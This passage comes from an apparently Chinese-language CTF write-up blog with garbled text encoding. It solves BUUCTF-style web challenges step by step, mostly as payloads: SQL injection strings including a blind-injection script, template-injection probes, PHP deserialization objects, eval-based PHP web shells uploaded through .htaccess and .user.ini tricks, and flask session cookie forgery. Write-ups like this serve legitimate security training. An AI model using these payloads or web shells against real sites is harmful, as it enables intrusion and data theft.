&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Try to find out source file!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹ä¼¼æ¯”è¾ƒå¤æ‚ä¸€ç‚¹ï¼Œä½†æ˜¯ifçš„æ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒ&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>?key=123
&lt;/code>&lt;/pre>&lt;p>flag{758691a1-017b-4033-899a-bd78281fbcc1}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æŠ¤ç½‘æ¯ 2018]easy_tornado
&lt;/h4>
&lt;/summary>
&lt;p>/hint.txtï¼šmd5(cookie_secret+md5(filename))&lt;/p>
&lt;p>/flag.txtï¼š/fllllllllllllag&lt;/p>
&lt;p>ç›®æ ‡æ˜¯æ‰¾åˆ°cookie_secretï¼Œåœ¨æŠ¥é”™é¡µé¢å‘çŽ°å¯èƒ½çš„æ¨¡æ¿æ¸²æŸ“&lt;/p>
&lt;pre tabindex="0">&lt;code>/error?msg={{handler.settings}}
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62&lt;/p>
&lt;pre tabindex="0">&lt;code>/file?filename=/fllllllllllllag&amp;amp;filehash=3725772b08f76e01024d81754c45f307
&lt;/code>&lt;/pre>&lt;p>flag{5756e16a-885e-4009-83e1-653a4818a39a}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag
&lt;/h4>
&lt;/summary>
&lt;p>/pay.phpï¼Œé¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>~~~post money and password~~~
if (isset($_POST['password'])) {
$password = $_POST['password'];
if (is_numeric($password)) {
echo &amp;quot;password can't be number&amp;lt;/br&amp;gt;&amp;quot;;
}elseif ($password == 404) {
echo &amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;;
}
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>is_numeric&lt;/code>å‡½æ•°ç”¨&lt;code>%20&lt;/code>ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>password=404%20&amp;amp;money[]=100000000
Cookie: user=1
&lt;/code>&lt;/pre>&lt;p>flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[HCTF 2018]admin
&lt;/h4>
&lt;/summary>
&lt;p>â€”â€”â€”â€”éžé¢„æœŸï¼šadmin: 123å¼±å£ä»¤&lt;/p>
&lt;p>â€”â€”â€”â€”è§£æ³•1ï¼š&lt;code>á´¬á´°á´¹á´µá´º&lt;/code>unicodeæ¬ºéª—ï¼Œæ³¨å†Œ&lt;code>á´¬á´°á´¹á´µá´º: 456&lt;/code>çš„å·ï¼Œæ”¹å¯†ä¸º999ï¼Œç™»å…¥&lt;/p>
&lt;p>â€”â€”â€”â€”è§£æ³•2ï¼šçœ‹cookieæ˜¯ç†Ÿæ‚‰çš„flask-sessionï¼Œæ”¹å¯†é¡µé¢/changeæç¤ºhttps://github.com/woadsl1234/hctf_flask/ï¼Œæ‹¿åˆ°secret=&amp;lsquo;ckj123&amp;rsquo;&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t &amp;quot;{'_fresh':True,'_id': b'Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=','csrf_token': b'NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==','image': b'eWl6eA==','name':'amiz','user_id':'10'}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}&lt;/p>
&lt;p>æ³¨æ„è¿™ä¸ªè„šæœ¬åŠ å¯†çš„æ—¶å€™çš„å†…éƒ¨éƒ½æ˜¯å•å¼•å·ï¼Œå¹¶ä¸”æ²¡æœ‰å¤šä½™çš„èŠ±æ‹¬å·&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[BJDCTF2020]Easy MD5
&lt;/h4>
&lt;/summary>
&lt;p>å“åº”å¤´æœ‰Hint: select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p>
&lt;p>phpä¸­md5çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶è¾“å‡º16å­—ç¬¦äºŒè¿›åˆ¶ï¼Œé»˜è®¤falseè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè¿”å›žraw md5&lt;/p>
&lt;p>mysqlä¸­åœ¨è¿›è¡Œå¸ƒå°”ç±»åž‹åˆ¤æ–­æ—¶ï¼Œ1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšintåž‹&lt;/p>
&lt;pre tabindex="0">&lt;code>password='xxx'or'1xxx'
password='xxx'or 1
password='xxx'or'1'
password='xxx'or true # ä»¥ä¸Šä¸‰è€…å‡è¿”å›žtrue
password='xxx'or'0trash' # false
&lt;/code>&lt;/pre>&lt;p>raw md5åŒ…å«å¾ˆå¤šå­—ç¬¦ï¼Œå¦‚æžœraw md5åŒ…å«&lt;code>'trash'or'1trash'&lt;/code>è¿™æ ·çš„ï¼Œå°±ä¼štrueï¼Œæ°¸çœŸ&lt;/p>
&lt;p>ä¸€ä¸ªå‚è€ƒpayloadæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>ffifdyop
hash: 276f722736c95d99e921722cf9ed621c
&lt;/code>&lt;/pre>&lt;p>çˆ†ç ´è„šæœ¬&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
for ($i = 0;;) {
for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
if (stripos(md5($i, true), '\'or\'') !== false)
echo &amp;quot;\nmd5($i) = &amp;quot; . md5($i, true) . &amp;quot;\n&amp;quot;;
echo &amp;quot;.&amp;quot;;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">Leet More 2010 Oh Those Admins! writeup&lt;/a>&lt;/p>
&lt;p>ä¹‹åŽè¿›å…¥ä¸‹ä¸€å…³ï¼Œé¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>$a = $GET['a'];
$b = $_GET['b'];
if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
&lt;/code>&lt;/pre>&lt;p>æ•°ç»„ç»•è¿‡ï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>/levels91.php?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>è¿›å…¥ä¸‹ä¸€å…³&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
include &amp;quot;flag.php&amp;quot;;
highlight_file(__FILE__);
if($_POST['param1']!==$_POST['param2']&amp;amp;&amp;amp;md5($_POST['param1'])===md5($_POST['param2'])){
echo $flag;
}
&lt;/code>&lt;/pre>&lt;p>ä¾æ—§æ•°ç»„ç»•è¿‡ï¼Œæ³¨æ„post&lt;/p>
&lt;pre tabindex="0">&lt;code>/levell14.php
param1[]=1&amp;amp;param2[]=2
&lt;/code>&lt;/pre>&lt;p>flag{78df171e-faa3-4c31-922f-a1f532e06dac}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ZJCTF 2019]NiZhuanSiWei
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
$text = $_GET[&amp;quot;text&amp;quot;];
$file = $_GET[&amp;quot;file&amp;quot;];
$password = $_GET[&amp;quot;password&amp;quot;];
if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,'r')===&amp;quot;welcome to the zjctf&amp;quot;)){
echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,'r').&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;;
if(preg_match(&amp;quot;/flag/&amp;quot;,$file)){
echo &amp;quot;Not now!&amp;quot;;
exit();
}else{
include($file); //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æŒ‡å®šäº†&lt;code>r&lt;/code>ï¼Œç”¨&lt;code>data://&lt;/code>ä¼ªåè®®&lt;/p>
&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class Flag{ //flag.php
public $file;
public function __tostring(){
if(isset($this-&amp;gt;file)){
echo file_get_contents($this-&amp;gt;file);
echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
return (&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;);
}
}
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>éžå¸¸ç®€å•çš„ååºåˆ—åŒ–&lt;/p>
&lt;pre tabindex="0">&lt;code>$a = new Flag();
$a-&amp;gt;file = 'flag.php';
echo serialize($a);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;quot;Flag&amp;quot;:1:{s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>flag{0e255178-c131-4073-beb9-5821c29c0c3c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SUCTF 2019]CheckIn
&lt;/h4>
&lt;/summary>
&lt;p>ä¼ pure.phtmlï¼Œå¯¹åŽç¼€æ£€æµ‹ï¼Œjpgä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹ï¼Œè€ƒè™‘ä¸Šä¼ .user.ini&lt;/p>
&lt;p>pure2.gif&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>.user.ini&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
auto_prepend_file=pure2.gif
&lt;/code>&lt;/pre>&lt;p>uploads/cc551ab005b2e60fbdc88de809b2c4b1&lt;/p>
&lt;p>ä¼ çš„æ—¶å€™æ–‡ä»¶é‡åç»™è¿œç¨‹çŽ¯å¢ƒæ•´å´©äº†ï¼Œæ‡’å¾—é‡å¼€äº†ï¼Œå¯„&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL
&lt;/h4>
&lt;/summary>
&lt;p>ä¹‹å‰å‡ ä¸ªåˆ†åˆ«ç”¨äº†ä¸‡èƒ½å¯†ç ï¼Œè”åˆæŸ¥è¯¢ï¼ŒåŒå†™ï¼Œè¿™æ¬¡è½®åˆ°æŠ¥é”™æ³¨å…¥äº†&lt;/p>
&lt;p>è¿‡æ»¤äº†&lt;code>=&lt;/code>ï¼Œæ¢æˆ&lt;code>(a)like(b)&lt;/code>è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23 # H4rDsq1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))%23 # id,username,password
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23
&lt;/code>&lt;/pre>&lt;p>flag{64053c33-96f3-4bea-8e94-02fb81e48236}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[MRCTF2020]ä½ ä¼ ä½ ðŸŽå‘¢
&lt;/h4>
&lt;/summary>
&lt;p>ä¼ .htaccess&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;FilesMatch &amp;quot;wuhu&amp;quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess&lt;/p>
&lt;p>ä¼ wuhu.jpg&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg&lt;/p>
&lt;p>è¿žèšå‰‘ï¼Œæ‹¿flag&lt;/p>
&lt;p>flag{0188a589-fefe-4939-95d1-cbcc433fc9b2}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[MRCTF2020]Ez_bypass
&lt;/h4>
&lt;/summary>
&lt;p>æŽ’ç‰ˆé—®é¢˜ï¼Œçœ‹é¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&amp;amp;&amp;amp;isset($_GET['id'])) {
$id=$_GET['id'];
$gg=$_GET['gg'];
if (md5($id) === md5($gg) &amp;amp;&amp;amp; $id !== $gg) {
echo 'You got the first step';
if(isset($_POST['passwd'])) {
$passwd=$_POST['passwd'];
if (!is_numeric($passwd))
{
if($passwd==1234567)
{
echo 'Good Job!';
highlight_file('flag.php');
die('By Retr_0');
}
else
{
echo &amp;quot;can you think twice??&amp;quot;;
}
}
else{
echo 'You can not get it !';
}
}
else{
die('only one way to get the flag');
}
}
else {
echo &amp;quot;You are not a real hacker!&amp;quot;;
}
}
else{
die('Please input first');
}
}Please input first
&lt;/code>&lt;/pre>&lt;p>md5æ•°ç»„ç»•è¿‡ï¼Œ&lt;code>is_numeric&lt;/code>ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>/?id[]=1&amp;amp;gg[]=2
POST: passwd=1234567%20
&lt;/code>&lt;/pre>&lt;p>flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 é’é¾™ç»„]AreUSerialz
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
class FileHandler {
protected $op;
protected $filename;
protected $content;
function __construct() {
$op = &amp;quot;1&amp;quot;;
$filename = &amp;quot;/tmp/tmpfile&amp;quot;;
$content = &amp;quot;Hello World!&amp;quot;;
$this-&amp;gt;process();
}
public function process() {
if($this-&amp;gt;op == &amp;quot;1&amp;quot;) {
$this-&amp;gt;write(); // æ–‡ä»¶å†™
} else if($this-&amp;gt;op == &amp;quot;2&amp;quot;) {
$res = $this-&amp;gt;read(); // æ–‡ä»¶è¯» è¯»flag
$this-&amp;gt;output($res);
} else {
$this-&amp;gt;output(&amp;quot;Bad Hacker!&amp;quot;);
}
}
private function write() {
if(isset($this-&amp;gt;filename) &amp;amp;&amp;amp; isset($this-&amp;gt;content)) {
if(strlen((string)$this-&amp;gt;content) &amp;gt; 100) {
$this-&amp;gt;output(&amp;quot;Too long!&amp;quot;);
die();
}
$res = file_put_contents($this-&amp;gt;filename, $this-&amp;gt;content);
if($res) $this-&amp;gt;output(&amp;quot;Successful!&amp;quot;);
else $this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
} else {
$this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
}
}
private function read() {
$res = &amp;quot;&amp;quot;;
if(isset($this-&amp;gt;filename)) {
$res = file_get_contents($this-&amp;gt;filename); // æ–‡ä»¶è¯»
}
return $res;
}
private function output($s) {
echo &amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;;
echo $s;
}
function __destruct() {
if($this-&amp;gt;op === &amp;quot;2&amp;quot;) // å¼ºæ¯”è¾ƒ $op=2 intç±»åž‹ç»•è¿‡
$this-&amp;gt;op = &amp;quot;1&amp;quot;;
$this-&amp;gt;content = &amp;quot;&amp;quot;;
$this-&amp;gt;process();
}
}
function is_valid($s) {
for($i = 0; $i &amp;lt; strlen($s); $i++)
if(!(ord($s[$i]) &amp;gt;= 32 &amp;amp;&amp;amp; ord($s[$i]) &amp;lt;= 125)) // åªå…è®¸å¤§å°å†™+æ•°å­—+æ™®é€šå­—ç¬¦ å³å¯è§å­—ç¬¦
return false;
return true;
}
if(isset($_GET{'str'})) {
$str = (string)$_GET['str'];
if(is_valid($str)) {
$obj = unserialize($str); // å…ˆè¿‡æ»¤å†ååºåˆ—åŒ–
}
}
&lt;/code>&lt;/pre>&lt;p>å‘ç‚¹åœ¨äºŽ&lt;code>private function&lt;/code>åºåˆ—åŒ–ä¹‹åŽä¼šäº§ç”Ÿä¸å¯è§å­—ç¬¦ï¼Œä¸¤ç§ç»•è¿‡æ–¹å¼ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±žæ€§ä¸æ•æ„Ÿï¼Œæœ¬åœ°æž„é€ payloadæ—¶å…¨æ”¹ä¸ºpublicï¼›æˆ–è€…å°†&lt;code>%00*%00&lt;/code>æ”¹ä¸ºåå…­è¿›åˆ¶çš„&lt;code>\00*\00&lt;/code>ï¼ŒåŒæ—¶å°†åºåˆ—åŒ–ç»“æžœä¸­çš„sæ”¹ä¸ºS&lt;/p>
&lt;p>è¿™é‡Œç”¨ç¬¬ä¸€ç§ï¼Œprivateå…¨æ”¹public&lt;/p>
&lt;pre tabindex="0">&lt;code>$obj = new FileHandler();
$obj-&amp;gt;op = 2;
$obj-&amp;gt;filename = 'php://filter/convert.base64-encode/resource=flag.php';
echo serialize($obj);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?str=O:11:&amp;quot;FileHandler&amp;quot;:3:{s:2:&amp;quot;op&amp;quot;;i:2;s:8:&amp;quot;filename&amp;quot;;s:52:&amp;quot;php://filter/convert.base64-encode/resource=flag.php&amp;quot;;s:7:&amp;quot;content&amp;quot;;N;}
&lt;/code>&lt;/pre>&lt;p>flag{0138599e-6ac8-4573-b448-e15635135f63}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GXYCTF2019]BabySQli
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤ºï¼šselect * from user where username = &amp;lsquo;$name&amp;rsquo;ï¼›è¿™è¯´äº†è·Ÿæ²¡è¯´ä¸€æ ·ï¼Œæ²¡å‘Šè¯‰wafæ˜¯å•¥&lt;/p>
&lt;p>å¤§å†™ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>1'Order by 3%23 # æœ‰3åˆ—
1'union select 1,2,3%23 # wrong user!
1'union select 1,'admin',3%23 # wrong pass! è¯´æ˜Žç”¨æˆ·ååœ¨ç¬¬äºŒåˆ—
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬é‡‡ç”¨çš„æ–¹å¼æ˜¯è”åˆæŸ¥è¯¢ åˆ›å»ºä¸€è¡Œä¸´æ—¶çš„æ–°æ•°æ®ï¼Œä»¥è¿™ä¸ªä¸´æ—¶æ•°æ®ç™»å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>name=1'union select 1,'admin','202cb962ac59075b964b07152d234b70'#&amp;amp;pw=123
&lt;/code>&lt;/pre>&lt;p>flag{a544cd1d-4676-41d2-8110-837020cf11e5}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GYCTF2020]Blacklist
&lt;/h4>
&lt;/summary>
&lt;p>è·Ÿqwbçš„éšä¾¿æ³¨éžå¸¸åƒï¼Œæ‹¿payloadæ¥è¯•è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>1';show tables;
1';show columns from `FlagHere`;
1';show columns from `words`;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `FlagHere`;');Prepare x from @xx;execute x;
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
&lt;/code>&lt;/pre>&lt;p>ç”¨&lt;code>handler on&lt;/code>ä»£æ›¿&lt;code>select&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>1'; handler FlagHere open as amiz; handler amiz read first; handler amiz close;#
&lt;/code>&lt;/pre>&lt;p>&lt;code>handler...open&lt;/code>æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶åŽç»­å¯ä»¥ä½¿ç”¨&lt;code>handler...read&lt;/code>è®¿é—®ï¼Œå¹¶ä¸”åœ¨è¯¥ä¼šè¯&lt;code>handler...close&lt;/code>æˆ–ç»ˆæ­¢å‰ä¸ä¼šå…³é—­&lt;/p>
&lt;p>flag{9ba3c903-1a8c-4a40-b32a-f9752251269c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[CISCN2019 åŽåŒ—èµ›åŒº Day2 Web1]Hack World
&lt;/h4>
&lt;/summary>
&lt;p>é•¿å¾—è·Ÿå‰é¢çš„éšä¾¿æ³¨å’ŒBlacklistå¾ˆåƒï¼Œç›´æŽ¥ç»™å‡ºäº†flagåœ¨flagè¡¨flagåˆ—&lt;/p>
&lt;p>æ‹¿fuzzå­—å…¸è¿‡ä¸€éï¼Œè¿‡æ»¤äº†and or union order group informationï¼Œç›²æ³¨pyè„šæœ¬èµ°èµ·ï¼Œä¸ŠäºŒåˆ†&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
url = 'http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php'
target = 'glzjin'
content = ''
for i in range(1, 40):
left = 32
right = 127
mid = (left + right) // 2
while right &amp;gt; left:
payload = f&amp;quot;if(ascii(substr((select(flag)from(flag)),{i},1))&amp;gt;{mid},1,2)&amp;quot;
data = {&amp;quot;id&amp;quot;:payload}
response = requests.post(url, data)
if target in response.text:
left = mid + 1
else:
right = mid
mid = (left + right) // 2
content += chr(int(mid))
print(content)
&lt;/code>&lt;/pre>&lt;p>flag{1b79970-4e0-e-b78f-2d63d8c77375}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2018]Fakebook
&lt;/h4>
&lt;/summary>
&lt;p>/robots.txtæç¤º/user.php.bak&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class UserInfo
{
public $name = &amp;quot;&amp;quot;;
public $age = 0;
public $blog = &amp;quot;&amp;quot;;
public function __construct($name, $age, $blog)
{
$this-&amp;gt;name = $name;
$this-&amp;gt;age = (int)$age;
$this-&amp;gt;blog = $blog;
}
function get($url)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($httpCode == 404) {
return 404;
}
curl_close($ch);
return $output;
}
public function getBlogContents ()
{
return $this-&amp;gt;get($this-&amp;gt;blog);
}
public function isValidBlog ()
{
$blog = $this-&amp;gt;blog;
return preg_match(&amp;quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&amp;quot;, $blog);
}
}
&lt;/code>&lt;/pre>&lt;p>æœ‰ä¸ªcurlï¼Œååºåˆ—åŒ–ç‚¹&lt;/p>
&lt;pre tabindex="0">&lt;code>$age = 18;
$blog = &amp;quot;file:///var/www/html/flag.php&amp;quot;;
$name = &amp;quot;amiz&amp;quot;;
$a = new UserInfo($name,$age,$blog);
echo serialize($a);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>O:8:&amp;quot;UserInfo&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;amiz&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯æœ¬èº«è¿™çŽ©æ„è¿˜å¾—æœ‰ä¸ªæ³¨å…¥ç‚¹ï¼Œå®ƒåœ¨urlæœ€åŽçš„&lt;code>no&lt;/code>å‚æ•°å¤„&lt;/p>
&lt;pre tabindex="0">&lt;code>/view.php?no=1 order by 4%23 # 5æŠ¥é”™ å…±4åˆ—
&lt;/code>&lt;/pre>&lt;p>ä¸ååºåˆ—åŒ–ä¹Ÿè¡Œï¼Œå®ƒæ²¡è¿‡æ»¤&lt;code>load_file&lt;/code>ç›´æŽ¥å°±è¯»æ–‡ä»¶äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>/view.php?no=-1 union/**/select/**/1,load_file(&amp;quot;/var/www/html/flag.php&amp;quot;),3,4%23
&lt;/code>&lt;/pre>&lt;p>æœ‰ç‚¹å¥‡æ€ªçš„ï¼Œä½ è¯´å®ƒè¿‡æ»¤ç©ºæ ¼ï¼Œä½†æ˜¯å‰é¢é‚£ä¸ªä¸ç”¨æ³¨é‡Šä¹Ÿå¯ä»¥ï¼Œè€Œä¸”å‰é¢å‚æ•°æ˜¯1è¿˜ä¸è¡Œ&lt;/p>
&lt;/details>
&lt;h2 id="page-07">page 07&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[FireshellCTF2020]URL TO PDF
&lt;/h4>
&lt;/summary>
&lt;p>ä¼šè®¿é—®ç»™å‡ºçš„ç½‘å€ï¼Œå¹¶æŠŠç»“æžœè½¬ä¸ºpdfå‘ˆçŽ°å‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209135327858.png" alt="image-20211209135327858">&lt;/p>
&lt;p>è¿™ä¸ªè¯·æ±‚å¤´æ˜¾ç¤ºæ˜¯WeasyPrint 51ï¼Œgoogleå¯ä»¥æœåˆ°è¿™ä¸€ç¯‡https://hackerone.com/reports/508123&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209135724639.png" alt="image-20211209135724639">&lt;/p>
&lt;p>å¦‚æžœé¡µé¢ä¸Šå­˜åœ¨è¿™æ ·çš„æ ‡ç­¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;attachment&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file:///flag&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;/p>
